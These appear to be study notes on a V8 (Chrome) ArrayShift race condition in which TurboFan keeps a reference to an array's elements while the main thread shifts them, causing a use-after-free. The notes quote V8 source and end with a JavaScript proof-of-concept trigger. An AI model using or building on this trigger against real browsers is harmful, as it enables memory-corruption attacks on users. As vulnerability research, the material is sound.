# ArrayShift Race Condition.

## TL;DR:
- Getting a double reference from the main thread and the turbofan thread to create a confusion. Thereby giving us a dangling pointer and UAF.

## Analysis:
- Builtins, ArrayShift:
    - remove the first element in the array and move the entire array left by 1. Free's the elements pointer and reallocates it.
    
- ReduceElementLoadFromHeapConstant():
    - When a value is being used continuously, it gets optimized to be used as a constant untill the cow array is changed.
    - tl;dr creates a reference to the element.

## Bug:
- When the turbofan thread does `ReduceElementLoadFromHeapConstant` it creates a reference to the array's element. Parallelly the main thread excecutes the shift prototype which will cause the reference to point to a free region in heap.
- Race: 
    -> turbofan - readuce heap constant
        ---     time gap    ---
    -> runtime 

```c
//  src/compiler/js-heap-broker.cc
return FixedArrayBaseRef(
        broker(), broker()-&gt;CanonicalPersistentHandle(object()-&gt;elements()));
```
> Will give you the pointer to the elements fixed array. PS: Handles are tracked by the v8 GC.

- filler object will be put in the place of the first element, after an ArrayShit happens.
```c
//  src/heap/heap.cc
CreateFillerObjectAt(old_start, bytes_to_trim,
                    MayContainRecordedSlots(object)
                        ? ClearRecordedSlots::kYes
                        : ClearRecordedSlots::kNo);
```

```
elements: 0x12fa08295ee1 <FixedArray[145]>
elements: 0x12fa08295ee5 <FixedArray[144]> 
elements: 0x12fa08295ee9 <FixedArray[143]>
After each shift operation in memory.
```

## Exploit:
```js
function exploit() {
    let bug_size = 120;
    let push_obj = [6969];
    let barr = [1.1];

    for(let i=0;i<bug_size;i++){
        barr.push(push_obj)
    }

    function dangling_ref() {

        barr.shift();
        for (let v19 = 0; v19 < 10000; v19++) {}
        let a = barr[0];

        gc();
        for (let v19 = 0; v19 < 500; v19++) {}
    }
    for (let i = 0; i < 4; i++) {
        dangling_ref();
    }
}
  
exploit();
```

## Reference:
- https://blog.exodusintel.com/2023/05/16/google-chrome-v8-arrayshift-race-condition-remote-code-execution/